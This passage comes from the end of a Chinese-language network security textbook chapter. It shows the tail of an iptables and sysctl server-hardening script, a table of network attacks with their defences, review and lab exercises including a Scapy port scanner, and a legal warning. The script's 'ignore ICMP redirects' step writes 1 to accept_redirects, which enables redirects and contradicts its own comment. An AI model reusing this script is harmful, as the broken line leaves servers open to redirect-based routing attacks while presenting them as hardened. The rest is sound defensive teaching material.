iptables -A INPUT -i eth0 -s 127.0.0.0/8 -j DROP
iptables -A INPUT -i eth0 -s 0.0.0.0/8 -j DROP
iptables -A INPUT -i eth0 -s 169.254.0.0/16 -j DROP
iptables -A INPUT -i eth0 -s 224.0.0.0/4 -j DROP
iptables -A INPUT -i eth0 -s 240.0.0.0/4 -j DROP

# 11. 日志记录被丢弃的包
iptables -A INPUT -m limit --limit 5/min -j LOG \
  --log-prefix "IPTables-Dropped: " --log-level 4

# 12. 丢弃其他所有入站包
iptables -A INPUT -j DROP

echo "[*] Hardening complete. Current rules:"
iptables -L -n -v

# 13. 启用 SYN Cookie
echo 1 > /proc/sys/net/ipv4/tcp_syncookies
echo "[*] SYN Cookie enabled"

# 14. 禁用 IP 转发（非路由器）
echo 0 > /proc/sys/net/ipv4/ip_forward
echo "[*] IP forwarding disabled"

# 15. 忽略 ICMP 重定向
echo 1 > /proc/sys/net/ipv4/conf/all/accept_redirects
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
echo "[*] ICMP redirects disabled"

# 16. 启用反向路径过滤
echo 1 > /proc/sys/net/ipv4/conf/all/rp_filter
echo "[*] Reverse path filtering enabled"

echo "[*] Server hardening complete!"
```

---

## 26.9 本章小结

| 攻击类型 | 原理 | 防御措施 |
|---------|------|---------|
| 端口扫描 | 探测开放端口和服务 | 防火墙、IDS、端口敲门 |
| SYN Flood | 耗尽 SYN 队列 | SYN Cookie、速率限制 |
| Slowloris | 保持半开连接 | 连接超时、Web 应用防火墙 |
| DNS 放大 | 利用反射放大流量 | BCP38、关闭开放递归 |
| ARP 欺骗 | 伪造 ARP 绑定 | 静态 ARP、DAI |
| DNS 投毒 | 注入虚假缓存记录 | DNSSEC、随机端口 |
| BGP 劫持 | 虚假路由通告 | RPKI、ROA |
| XSS | 注入恶意脚本 | 输入验证、CSP |
| CSRF | 伪造用户请求 | CSRF Token、SameSite Cookie |

**关键防御原则**：
1. **纵深防御**：多层安全措施，不依赖单一防线
2. **最小权限**：只开放必要的端口和服务
3. **持续监控**：部署 SIEM、NetFlow 等监控系统
4. **及时更新**：保持系统和软件最新版本
5. **安全审计**：定期进行安全评估和渗透测试

---

## 26.10 练习题

### 基础题

**26.1** 简述 TCP SYN 扫描和 TCP Connect 扫描的区别，各自的优缺点是什么？

**26.2** 解释 SYN Cookie 的工作原理。为什么 SYN Cookie 能有效防御 SYN Flood 攻击？

**26.3** 什么是 BCP38？它如何帮助防御 DDoS 攻击中的 IP 欺骗？

### 进阶题

**26.4** 设计一个 ARP 欺骗检测系统，需要考虑：
- 如何建立合法的 MAC-IP 绑定表
- 如何处理 DHCP 环境下的 IP 变化
- 如何降低误报率

**26.5** 比较 NetFlow 和 sFlow 的优缺点，说明各自适用的场景。

**26.6** 分析 Kaminsky DNS 缓存投毒攻击的原理，并解释 DNSSEC 如何防御此类攻击。

### 实验题

**26.7** 使用 Python 和 Scapy 实现一个简单的端口扫描器，支持：
- SYN 扫描和 Connect 扫描模式
- 多线程并发扫描
- 结果输出和统计

**26.8** 配置 Linux iptables 防火墙规则，实现：
- 防 SYN Flood 攻击
- 防端口扫描
- 速率限制
- 日志记录

---

> **安全警告**：本章介绍的攻击技术仅用于网络安全教育和授权的安全测试。未经授权对他人系统进行攻击是违法行为，可能面临严重的法律后果。
